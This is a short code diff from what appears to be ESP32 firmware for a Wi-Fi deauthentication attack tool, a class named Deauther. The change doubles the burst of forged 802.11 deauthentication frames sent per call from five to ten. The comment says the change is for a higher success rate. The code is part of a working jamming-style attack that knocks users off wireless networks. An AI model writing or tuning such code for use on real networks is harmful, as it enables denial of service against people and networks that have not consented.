@@ -99,7 +99,7 @@ void Deauther::sendPacket(const uint8_t* targetBssid, int channel, const uint8_t
     // If clientMac is null, the broadcast address from the template is used.
 
     // Send a burst of packets for higher success rate
-    for (int i = 0; i < 5; i++) {
+    for (int i = 0; i < 10; i++) {
         esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
         delay(2); // Small delay between packets
     }
